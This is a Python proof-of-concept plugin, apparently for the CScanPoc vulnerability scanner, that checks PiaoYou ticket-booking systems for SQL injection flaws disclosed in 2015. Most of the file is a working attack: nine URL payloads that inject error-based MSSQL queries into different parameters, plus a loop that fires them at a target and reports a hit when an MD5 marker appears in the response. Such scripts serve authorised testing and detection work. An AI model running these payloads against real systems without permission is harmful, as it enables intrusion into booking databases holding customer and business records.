# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import time
import urllib.request
import urllib.parse
import urllib.error


class Vuln(ABVuln):
    vuln_id = 'PiaoYou_0011'  # 平台漏洞编号，留空
    name = '票友订票系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-03-13'  # 漏洞公布时间
    desc = '''
        票友软件是一款用于航空票务代理专用机票管理系统，集成网上订票管理、电话录音弹屏、企业差旅管理、同业订单管理、会员管理、积分管理、短信发送、员工管理、报表生成、财务管理等强大功能，广泛应用于有各航空票务代理人及航空售票点，帮助您提高工作效率，迅速了解客户的需求，极大提高业务成交量，提升客户满意度，协助您在激烈的市场竞争中脱颖而出。
        票友订票系统存在多处SQL注入漏洞：
        /json_db/other_report.aspx
        /json_db/flight_return.aspx
        /json_db/meb_list.aspx
        /json_db/air_company.aspx
        /json_db/order_gys.aspx
        /json_db/air_company.aspx
        /Json_db/flight_report.aspx
        /Json_db/flight_search.aspx
        /info/zclist_view.aspx
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0101090'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PiaoYou(票友软件)'  # 漏洞应用名称
    product_version = '票友订票系统'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'baf08e07-6284-4a27-a790-9050b3dcc948'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            # No.3 http://www.wooyun.org/bugs/wooyun-2010-0101090
            # No.4 http://www.wooyun.org/bugs/wooyun-2010-0101091
            # No.5 http://www.wooyun.org/bugs/wooyun-2010-0101092
            # No.6 http://www.wooyun.org/bugs/wooyun-2010-0101093
            # No.7 http://www.wooyun.org/bugs/wooyun-2010-0101102
            # No.8 http://www.wooyun.org/bugs/wooyun-2010-0101103
            # No.9 http://www.wooyun.org/bugs/wooyun-2010-0101104
            # No.10 http://www.wooyun.org/bugs/wooyun-2010-0101106
            payloads = [
                "/json_db/other_report.aspx?its=3&jq=0&stype=&dfs=0&levels=1%27%20and/**/1=convert(int,(select/**/sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))))%20and/**/%271%27=%271",
                "/json_db/flight_return.aspx?sdate=2015-03-13&edate=2015-03-13&cp=1%27%20and/**/1=convert(int,(select/**/sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))))%20and/**/%271%27=%271",
                "/json_db/meb_list.aspx?type=1%27%20and/**/1=convert(int,(select/**/sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))))%20and/**/%271%27=%271",
                "/json_db/air_company.aspx?air=0&key=1%27%20and/**/1=convert(int,(select/**/sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))))%20and/**/%271%27=%271",
                "/json_db/order_gys.aspx?stype=0&key=1%27%20and/**/1=convert(int,(select/**/sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))))%20and/**/%271%27=%271",
                "/json_db/air_company.aspx?air=0&key=1%27%20and/**/1=convert(int,(select/**/sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))))%20and/**/%271%27=%271",
                "/Json_db/flight_report.aspx?dd=0&ee=2015-03-12&ff=2015-03-12&rr=1%27%20and/**/1=convert(int,(select/**/sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))))%20and/**/%271%27=%271",
                "/Json_db/flight_search.aspx?jq=0&kefu=admin&stype=&ptype=&ddw=1&sdate=2010-03-12&edate=2015-03-12&cp=1%27%20and/**/1=convert(int,(select/**/sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))))%20and/**/%271%27=%271",
                "/info/zclist_view.aspx?id=40%20and/**/1=convert(int,(select/**/sys.fn_varbintohexstr(hashbytes('MD5','1'))))%20and/**/1=1"
            ]
            for payload in payloads:
                target = self.target + payload
                code, head, body, errcode, final_url = hh.http(target)
                if 'c4ca4238a0b923820dcc509a6f75849' in body:
                    # security_hole(target)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                        target=self.target, name=self.vuln.name, url=target))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
